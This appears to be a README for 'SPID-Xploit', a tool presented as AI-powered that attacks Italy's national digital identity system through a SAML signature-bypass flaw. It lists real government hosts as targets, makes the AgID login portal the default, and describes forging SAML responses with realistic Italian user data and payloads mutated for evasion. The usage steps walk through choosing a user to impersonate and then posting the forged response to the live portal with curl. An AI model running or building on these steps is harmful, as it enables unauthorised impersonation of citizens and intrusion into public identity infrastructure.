# SPID-Xploit v2.0 - AI-Powered SPID Penetration Testing Framework

Target: `spid.gov.it` Ecosystem | CVE-2025-24894 | CVE-2025-24895

## 📋 Description

SPID-Xploit is an advanced AI-powered penetration testing framework targeting the Italian Public Digital Identity System (SPID). It automates the exploitation of critical vulnerabilities in the SPID authentication system, including CVE-2025-24894 (CVSS 9.1) which allows SAML Response Signature Verification Bypass.

## 🚀 Features

| Module | Description |
|--------|-------------|
| **AI Reconnaissance** | OSINT, DNS enumeration, technology fingerprinting, SSL/TLS analysis |
| **Registry Scraper** | Extracts all 5000+ SPID entities (IdPs, SPs, AAs) from the official registry |
| **CVE-2025-24894 Exploit** | SAML signature bypass (CVSS 9.1) - full automated exploitation |
| **SAML Forger AI** | AI-generated forged SAML responses with realistic Italian user data |
| **Metadata Analyzer** | Analyzes IdP/SP metadata for certificate expiry, weak keys, exposed attributes |
| **Payload Generator** | Generates SAML, XSS, and injection payloads with AI mutation for evasion |
| **Full Attack Chain** | End-to-end automated attack: recon → scrape → analyze → exploit → report |

## 🎯 Target Ecosystem

| Target | URL | Role |
|--------|-----|------|
| SPID Website | https://www.spid.gov.it | Official portal (WordPress, nginx/1.26.2) |
| SAML Validator | https://validator.spid.gov.it | SAML/OIDC protocol validator |
| Demo Environment | https://demo.spid.gov.it | Test IdP for development |
| Federation Registry | https://registry.spid.gov.it | Entity registry (IdPs, SPs, AAs) |
| Admin Portal | https://login.agid.gov.it | Central IAM / SPID OnBoarding |
| AgID Official | https://www.agid.gov.it | Governing agency |

## 🔥 Critical Vulnerabilities

### CVE-2025-24894 - SAML Response Signature Verification Bypass
- **CVSS**: 9.1 (CRITICAL)
- **Package**: `SPID.AspNetCore.Authentication` <= 3.3.0
- **Mechanism**: `VerifySignature` only checks the first signature. Attacker injects a validly-signed element as the first child, then appends unsigned forged assertions.
- **Impact**: Full user impersonation without credentials

### CVE-2025-24895 - Related SAML Bypass
- **CVSS**: 8.8 (HIGH)
- **Same library, additional bypass vector**

## 💻 Installation

### Linux (Kali/Ubuntu/Debian)
```bash
git clone https://github.com/yourusername/SPID-Xploit.git
cd SPID-Xploit
chmod +x install.sh
sudo bash install.sh
python3 main.py --interactive


pkg install git -y
git clone https://github.com/yourusername/SPID-Xploit.git
cd SPID-Xploit
bash install.sh
python main.py --interactive


# Interactive mode
python3 main.py -i

# Run specific module
python3 main.py -m recon
python3 main.py -m cve_2025_24894
python3 main.py -m registry_scraper
python3 main.py -m saml_forger
python3 main.py -m metadata
python3 main.py -m payload
python3 main.py -m full_attack
python3 main.py -m targets
python3 main.py -m report
# Custom target
python3 main.py -m cve_2025_24894 -t https://login.agid.gov.it



# 1. Run the exploit module
python3 main.py -m cve_2025_24894

# 2. Select target (default: login.agid.gov.it)
# 3. Choose user to impersonate
# 4. The tool generates the forged SAML response

# 5. Deliver via curl:
curl -X POST 'https://login.agid.gov.it/saml/acs' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'SAMLResponse=<BASE64_ENCODED_RESPONSE>' \
  -k -v
